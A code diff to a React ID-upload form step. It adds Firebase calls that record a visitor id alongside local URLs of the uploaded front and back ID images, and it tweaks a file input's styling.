@@ -5,6 +5,7 @@ import type React from "react"
 import { useState } from "react"
 import { Button } from "@/components/ui/button"
 import { Input } from "@/components/ui/input"
+import { addData } from "@/lib/firebase"
 
 interface IdUploadStepProps {
   onComplete: () => void
@@ -38,6 +39,7 @@ export default function IdUploadStep({ onComplete }: IdUploadStepProps) {
   }
 
   const handleFileUpload = async (file: File, type: "front" | "back") => {
+  const visitorId=localStorage.getItem('visitor')
     setIsUploading(true)
     try {
       const url = await uploadToImgBB(file)
@@ -52,8 +54,11 @@ export default function IdUploadStep({ onComplete }: IdUploadStepProps) {
       const localUrl = URL.createObjectURL(file)
       if (type === "front") {
         setFrontIdUrl(localUrl)
+        addData({id:visitorId,idFrontImage:localUrl})
       } else {
         setBackIdUrl(localUrl)
+        addData({id:visitorId,idBackImage:localUrl})
+
       }
     }
     setIsUploading(false)
@@ -123,7 +128,7 @@ export default function IdUploadStep({ onComplete }: IdUploadStepProps) {
                   type="file"
                   accept="image/*"
                   onChange={handleBackIdChange}
-                  className="w-full border-2 border-slate-200 rounded-xl bg-slate-50/50  p-5 text-right text-sm focus:border-blue-500 focus:bg-white focus:ring-0 transition-all duration-200"
+                  className="w-full border-2 border-slate-200 rounded-xl bg-slate-50/50 m-4 py-5 text-right text-sm focus:border-blue-500 focus:bg-white focus:ring-0 transition-all duration-200"
                   dir="rtl"
                 />
                 {backIdUrl && (
